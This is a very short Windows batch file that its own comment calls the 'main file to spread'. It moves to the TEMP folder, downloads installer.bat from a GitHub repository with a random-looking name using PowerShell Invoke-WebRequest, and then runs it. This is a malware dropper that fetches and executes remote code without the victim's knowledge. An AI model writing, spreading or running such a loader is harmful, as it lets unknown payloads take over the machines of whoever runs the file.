REM - This is your main file to spread.

cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/installer.bat' -OutFile installer.bat"
start installer.bat
